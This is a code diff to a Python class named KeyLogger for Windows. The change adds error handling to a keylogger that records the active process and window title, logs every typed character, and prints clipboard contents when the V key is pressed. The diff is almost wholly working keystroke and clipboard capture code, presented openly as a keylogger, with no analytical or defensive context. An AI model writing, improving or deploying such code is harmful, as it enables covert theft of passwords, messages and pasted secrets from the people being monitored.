@@ -28,39 +28,49 @@ class KeyLogger:
         
         executable = create_string_buffer(512)
         hProcess = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
-        windll.psapi.GetModuleBaseNameA(hProcess, None, byref(executable), 512)
-        windowTitle = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
         
-        try:
-            self.currentWindow = windowTitle.value.decode()
-        except UnicodeDecodeError as e:
-            print(f'{e}: window name unknown')
-        
-        print('\n', processID, executable.value.decode(), self.currentWindow)
-        
-        windll.kernel32.CloseHandle(hwnd)
-        windll.kernel32.CloseHandle(hProcess)
+        if hProcess:
+            windll.psapi.GetModuleBaseNameA(hProcess, None, byref(executable), 512)
+            windowTitle = create_string_buffer(512)
+            windll.user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
+            
+            try:
+                self.currentWindow = windowTitle.value.decode()
+            except UnicodeDecodeError as e:
+                print(f'{e}: window name unknown')
+            
+            print('\n', processID, executable.value.decode(), self.currentWindow)
+            
+            windll.kernel32.CloseHandle(hwnd)
+            windll.kernel32.CloseHandle(hProcess)
+            
+        else:
+            print(f'Failed to get handle for process with PID: {processID}')
     
     def keystroke(self, event):
     
-        # Get window name if this isn't the current window
-        if event.WindowName != self.currentWindow:
-            self.getCurrentProcess()
-        
-        # Identify what key it was
-        if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end='')
-        else:
-            if event.Key == 'V':
-                win32clipboard.OpenClipboard()
-                value = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
-                print(f'[PASTE] - {value}')
+        try:
+    
+            # Get window name if this isn't the current window
+            if event.WindowName != self.currentWindow:
+                self.getCurrentProcess()
+            
+            # Identify what key it was
+            if 32 < event.Ascii < 127:
+                print(chr(event.Ascii), end='')
             else:
-                print(f'{event.Key}')
-        
-        return True
+                if event.Key == 'V':
+                    win32clipboard.OpenClipboard()
+                    value = win32clipboard.GetClipboardData()
+                    win32clipboard.CloseClipboard()
+                    print(f'[PASTE] - {value}')
+                else:
+                    print(f'{event.Key}')
+            
+            return True
+
+        except Exception as e:
+            print(str(e))
     
 #===========================#
     
